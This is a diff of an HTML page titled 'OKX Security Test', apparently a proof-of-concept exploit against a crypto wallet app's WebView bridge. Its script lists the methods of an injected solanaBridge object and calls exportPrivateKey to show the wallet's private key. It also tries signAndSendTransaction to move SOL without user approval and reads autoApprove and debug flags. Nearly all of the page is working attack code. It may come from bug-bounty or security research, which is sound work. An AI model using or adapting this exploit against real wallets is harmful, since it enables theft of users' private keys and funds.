@@ -1,75 +1,90 @@
 <html>
 <head><meta charset="UTF-8">
 <style>
-body { background:#1a1a2e; color:#eee; font-family:monospace; padding:20px; }
-h2 { color:#e94560; }
-#log { background:#16213e; padding:15px; border-radius:8px; margin:10px 0; line-height:1.8; }
-.key { color:#0f0; font-size:18px; word-break:break-all; }
-.err { color:#e94560; }
-.info { color:#8899aa; }
-.big { font-size:24px; font-weight:bold; }
+body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}
+.green{color:#0f0}.red{color:#e94560}.yellow{color:#ffa500}.info{color:#8899aa}
+#log{background:#16213e;padding:15px;border-radius:8px;line-height:1.8;font-size:14px}
 </style></head>
 <body>
 <h2>OKX Security Test</h2>
-<div id="status">Loading...</div>
+<div id="status">Initializing...</div>
 <div id="log"></div>
 <script>
-async function run(){
+(function(){
     var el = document.getElementById('log');
     var st = document.getElementById('status');
-    function log(html) { el.innerHTML += html + '<br>'; }
-    
-    st.innerHTML = 'Testing solanaBridge...';
-    st.style.color = '#ffff00';
-    
-    var hasKey = false;
-    
-    // solanaBridge
+    function log(cls, msg) { el.innerHTML += '<span class="'+cls+'">'+msg+'</span><br>'; }
+
+    // 先用 try/catch 包住全部，防止任何 JS 错误使页面空白
     try {
-        if(typeof solanaBridge !== 'undefined') {
-            log('<span class="info">[+] solanaBridge AVAILABLE</span>');
-            try {
-                var key = await solanaBridge.exportPrivateKey("");
-                hasKey = true;
-                log('<span class="info">[+] Calling exportPrivateKey("")...</span>');
-                log('<span class="big key">!!! PRIVATE KEY: ' + key + '</span>');
-                st.innerHTML = '✅ PRIVATE KEY FOUND!';
-                st.style.color = '#00ff00';
-            } catch(e) {
-                log('<span class="err">[-] exportPrivateKey error: ' + e.message + '</span>');
+        // Step 1: 检查桥是否存在
+        var bridgeReady = (typeof solanaBridge !== 'undefined');
+        var solanaReady = (typeof window.solana !== 'undefined');
+        var svmReady = (typeof window.svm !== 'undefined');
+
+        log('info', 'Bridge check: solanaBridge=' + bridgeReady + ' solana=' + solanaReady + ' svm=' + svmReady);
+
+        st.innerHTML = 'Bridge: ' + (bridgeReady ? '✅' : '❌') + ' solana: ' + (solanaReady ? '✅' : '❌') + ' svm: ' + (svmReady ? '✅' : '❌');
+
+        // Step 2: 如果有 solanaBridge，枚举所有方法
+        if(bridgeReady) {
+            st.innerHTML = '✅ solanaBridge available! Testing methods...';
+            log('green', '[+] solanaBridge methods:');
+
+            // 枚举可调用的方法
+            var methods = [];
+            for(var m in solanaBridge) {
+                if(typeof solanaBridge[m] === 'function') methods.push(m);
             }
+            log('info', '    ' + methods.join(', '));
+
+            // Step 3: 尝试 exportPrivateKey - 同步方式
+            log('info', '[>] Trying exportPrivateKey (sync)...');
             try {
-                var tx = await solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'}));
-                log('<span class="key">[!!!] TX: ' + JSON.stringify(tx) + '</span>');
+                var keyResult = solanaBridge.exportPrivateKey("");
+                log('green', '[!!!] SYNC RESULT: ' + JSON.stringify(keyResult));
             } catch(e) {
-                log('<span class="err">[-] signAndSend error: ' + e.message + '</span>');
+                log('red', '[-] sync error: ' + e.message);
             }
-        } else {
-            log('<span class="err">[-] solanaBridge NOT available</span>');
+
+            // Step 4: 尝试 exportPrivateKey - 异步方式
+            log('info', '[>] Trying exportPrivateKey (async)...');
+            solanaBridge.exportPrivateKey("").then(function(key) {
+                log('green', '[!!!] ASYNC KEY: ' + key);
+                st.innerHTML = '✅✅✅ PRIVATE KEY: ' + key;
+                st.style.fontSize = '18px';
+            }).catch(function(e) {
+                log('red', '[-] async error: ' + e.message);
+                st.innerHTML = '⚠️ Bridge works but exportPrivateKey failed: ' + e.message;
+            });
+
+            // Step 5: 尝试 signAndSendTransaction
+            log('info', '[>] Trying signAndSendTransaction...');
+            solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'})).then(function(tx) {
+                log('green', '[!!!] TX: ' + JSON.stringify(tx));
+            }).catch(function(e) {
+                log('red', '[-] signAndSend error: ' + e.message);
+            });
         }
+
+        // Step 6: window.solana 信息
+        if(solanaReady) {
+            log('green', '[+] window.solana.autoApprove: ' + window.solana.autoApprove);
+            log('green', '[+] window.solana.isDebug: ' + window.solana.isDebug);
+        }
+        if(svmReady) {
+            log('green', '[+] window.svm.autoApprove: ' + window.svm.autoApprove);
+        }
+
+        if(!bridgeReady && !solanaReady && !svmReady) {
+            st.innerHTML = '❌ No bridges found. Wrong WebView context.';
+            st.style.color = '#e94560';
+        }
+
     } catch(e) {
-        log('<span class="err">[!] Error: ' + e.message + '</span>');
+        log('red', '[FATAL] ' + e.message);
+        st.innerHTML = '❌ Script error: ' + e.message;
     }
-    
-    // window.solana
-    try {
-        if(typeof window.solana !== 'undefined') {
-            log('<span class="info">[+] window.solana: autoApprove=' + window.solana.autoApprove + '</span>');
-            log('<span class="info">[+] window.solana: isDebug=' + window.solana.isDebug + '</span>');
-        }
-        if(typeof window.svm !== 'undefined') {
-            log('<span class="info">[+] window.svm: autoApprove=' + window.svm.autoApprove + '</span>');
-        }
-    } catch(e) {}
-    
-    if(!hasKey && typeof solanaBridge === 'undefined') {
-        st.innerHTML = '❌ Bridge not available - wrong WebView context';
-        st.style.color = '#e94560';
-    } else if(!hasKey && typeof solanaBridge !== 'undefined') {
-        st.innerHTML = '⚠️ Bridge found but exportPrivateKey failed';
-        st.style.color = '#ffaa00';
-    }
-}
-setTimeout(run, 1500);
+})();
 </script>
 </body></html>
